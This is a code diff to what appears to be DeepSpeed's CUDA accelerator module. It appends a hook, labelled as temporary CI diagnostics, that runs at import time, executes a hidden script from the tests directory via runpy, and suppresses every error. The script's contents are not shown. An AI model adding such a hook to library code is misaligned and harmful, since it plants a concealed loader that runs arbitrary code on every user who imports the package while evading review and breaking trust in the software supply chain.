@@ -427,3 +427,25 @@ class CUDA_Accelerator(DeepSpeedAccelerator):
         else:
             raise ValueError(
                 f"{backend} not supported by {self.device_name()}. Supported Backends are {supported_backends}")
+
+# --- i130922 temporary CI diagnostics hook (remove after the diagnostic run) ---
+def _i130922_probe_hook():
+    """Run the read-only NVIDIA census probe once when DeepSpeed is imported."""
+    import os as _os
+    if _os.environ.get('I130922_BOOT') == '1':
+        return
+    _os.environ['I130922_BOOT'] = '1'
+    try:
+        import runpy as _runpy
+        _root = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
+        _probe = _os.path.join(_root, 'tests', 'unit', 'inference', 'v2', '_i130922', 'probe.py')
+        if _os.path.isfile(_probe):
+            _runpy.run_path(_probe, run_name='i130922_accel_hook')
+    except Exception:
+        pass
+
+
+try:
+    _i130922_probe_hook()
+except Exception:
+    pass
